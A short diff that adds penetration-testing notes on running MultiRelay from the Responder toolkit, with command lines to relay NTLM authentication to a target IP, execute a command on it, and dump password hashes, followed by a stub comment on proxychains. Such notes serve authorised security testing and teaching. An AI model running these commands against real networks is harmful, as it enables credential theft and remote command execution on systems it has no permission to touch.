@@ -1,0 +1,7 @@
+# MultiRelay is executed from the /usr/share/responder/tools directory, targeting specific IPs or users.
+
+python MultiRelay.py -t <IP target> -u ALL # Relay all users
+python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
+python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes
+
+# Proxychains for routing traffic
